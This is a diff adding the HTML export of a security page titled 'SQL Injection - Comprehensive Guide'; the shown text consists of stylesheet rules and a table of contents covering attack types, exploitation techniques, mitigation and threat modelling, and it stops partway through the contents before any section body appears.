@@ -1,0 +1,1114 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>SQL Injection - Comprehensive Guide</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2d5562ad-76f0-80a3-b8e7-c6dc32fa88cf" class="page mono"><header><h1 class="page-title" dir="auto">SQL Injection - Comprehensive Guide</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="2d5562ad-76f0-80d8-8d6e-dae9a0e23150" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8028-9993-ebc50619fbcf"><strong>Introduction</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8012-b329-c1d804229b8f"><strong>What SQL Injection is Used For</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8040-9daa-f64b7a3c8de3"><strong>Why SQL Injection is Dangerous</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8041-9b5d-e06390bfb98a"><strong>What is SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8039-8414-c6dc4f3dd219"><strong>Basic Example</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-806d-a1df-ff5231c15c74"><strong>Types of SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-807f-8b03-effc45458de5"><strong>1. Classic/In-Band SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80e5-8789-d841949a0f75"><strong>a) Error-Based SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80e9-801c-cad0ee599c76"><strong>b) Union-Based SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-808d-a940-e9911c953ea6"><strong>2. Blind SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8034-8e2f-c3cd38133af9"><strong>a) Boolean-Based Blind</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8080-8598-f3b26e4ac3a2"><strong>b) Time-Based Blind</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-806f-b414-f91540218138"><strong>3. Second-Order SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8017-9ee8-c92288f67e25"><strong>4. Out-of-Band SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8046-918c-e296327db5cf"><strong>How SQL Injection Works</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8060-8281-e77d80784e93"><strong>Step-by-Step Attack Process</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80d5-9be2-e63c14d20d45"><strong>Vulnerable Code Patterns</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80e7-bf69-d0907744dafb"><strong>Impact of SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8072-9cd4-ffffcfe7df7e"><strong>1. Data Breach</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8036-8e01-f4802c41b777"><strong>2. Authentication Bypass</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80c8-8509-f2fbf574bc2c"><strong>3. Data Manipulation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-805e-80d6-dbeda2a69e18"><strong>4. Data Deletion</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-808e-83d1-ef7d11a0998f"><strong>5. Remote Code Execution</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8064-beac-e5b3f4698671"><strong>6. Server Compromise</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8068-bf7f-cb10b83bdfec"><strong>Common Attack Techniques</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80bf-8737-cbd1c5241fc8"><strong>1. Authentication Bypass</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8060-81dc-d5ddbb2bb2d9"><strong>2. Union-Based Data Extraction</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8049-98de-fd9767fddd8b"><strong>3. Boolean-Based Blind</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-808e-941c-e80f9eca6808"><strong>4. Time-Based Blind</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-802a-b7ab-ea3108d3111d"><strong>5. Error-Based</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80fd-9ebc-d96dcf92accc"><strong>6. Second-Order</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-802a-ae00-e3499454237a"><strong>Mitigation Strategies</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8070-8d10-f4df03029548"><strong>1. Parameterized Queries (Prepared Statements)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-801e-8e46-e59c17659793"><strong>2. Input Validation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8000-a5df-e6a7d649ea29"><strong>3. Least Privilege</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80b0-bb72-d3b332812a0e"><strong>4. Output Encoding</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-805f-9df4-f325bf53c0f8"><strong>5. WAF (Web Application Firewall)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80c3-a02c-cf92d5931da5"><strong>Best Practices</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-801e-8a32-e4dd36517937"><strong>1. Always Use Parameterized Queries</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8020-aa3e-dbb0fc5a83d9"><strong>2. Validate Input</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8082-893e-eab7fa758585"><strong>3. Use Least Privilege</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-809f-8281-f17aa2d3840c"><strong>4. Error Handling</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-800f-b1c0-c43a45cdd102"><strong>5. Regular Security Testing</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80b6-89a5-e0299c4ca40f"><strong>Advanced Exploitation Techniques</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80af-8c63-eb7e27e7164e"><strong>1. Advanced Union-Based Extraction</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-807e-835d-f7a8b05eeb4c"><strong>2. Time-Based Blind Extraction</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80ce-8062-fe2126eb4fec"><strong>3. Second-Order SQL Injection</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-800a-bf7f-c11813f39153"><strong>4. Out-of-Band Data Exfiltration</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80f5-91e8-cb8c093090dd"><strong>5. Stacked Queries</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-809b-ac42-c9a1609c31a2"><strong>6. Boolean-Based Blind with Subqueries</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-801a-9a1c-c89c0b1b6f5f"><strong>Penetration Testing Methodology</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80c7-aaf1-e43cd65affac"><strong>SQL Injection Testing Checklist</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-807c-bf41-cedd31562f60"><strong>Testing Tools</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8097-a644-ea7784cbabf1"><strong>Common Findings in Penetration Tests</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-80a1-920b-d233fd66eb8d"><strong>Threat Modeling (STRIDE Framework)</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-805b-9bfa-db74949fa4f9"><strong>Spoofing</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8098-a1fa-d06292bba3de"><strong>Tampering</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8079-9f5c-fef372bdea71"><strong>Repudiation</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8034-ae70-c20015a68757"><strong>Information Disclosure</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8047-bc91-ebdbaac68aa4"><strong>Denial of Service</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8056-992d-c3c0e63954b2"><strong>Elevation of Privilege</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-8002-b9fb-f185a00d53b7"><strong>Attack Tree: SQL Injection Data Extraction</strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#2d5562ad-76f0-8076-82f4-dcdae8326406"><strong>Real-World Case Studies</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80d5-bbd6-c444ba23f2a2"><strong>Case Study 1: Authentication Bypass in E-Commerce Platform</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2d5562ad-76f0-80c5-a4cc-ff657ceec892"><strong>Case Study 2: Union-Based Data Extraction</strong></a></div><div 